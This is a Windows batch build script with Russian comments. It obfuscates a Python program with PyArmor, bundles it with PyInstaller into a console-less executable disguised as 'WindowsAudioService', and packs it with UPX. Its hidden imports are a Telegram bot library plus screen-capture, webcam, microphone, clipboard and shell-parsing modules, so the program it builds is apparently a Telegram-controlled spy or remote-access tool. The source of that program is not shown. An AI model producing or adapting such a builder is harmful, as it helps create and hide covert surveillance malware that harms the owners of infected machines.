@echo off
chcp 65001 >nul
echo ================================================
echo     МАКСИМАЛЬНАЯ ОБФУСКАЦИЯ + ВСЕ МОДУЛИ
echo ================================================

echo [1] PyArmor...
pyarmor gen --obf-string 2 --obf-code 2 main.py -O dist\obf

echo [2] PyInstaller с максимумом hidden imports...
pyinstaller --onefile --noconsole --clean ^
            --name "WindowsAudioService" ^
            --icon "configuration2.ico" ^
            --hidden-import=telebot ^
            --hidden-import=telebot.types ^
            --hidden-import=pyautogui ^
            --hidden-import=cv2 ^
            --hidden-import=sounddevice ^
            --hidden-import=scipy ^
            --hidden-import=scipy.io ^
            --hidden-import=scipy.io.wavfile ^
            --hidden-import=numpy ^
            --hidden-import=pygame ^
            --hidden-import=pygame.mixer ^
            --hidden-import=PIL ^
            --hidden-import=PIL.ImageGrab ^
            --hidden-import=pyperclip ^
            --hidden-import=shlex ^
            --hidden-import=base64 ^
            dist\obf\main.py

echo [3] UPX...
upx --ultra-brute --force dist\WindowsAudioService.exe

echo.
echo ================================================
echo ГОТОВО!
echo ================================================
pause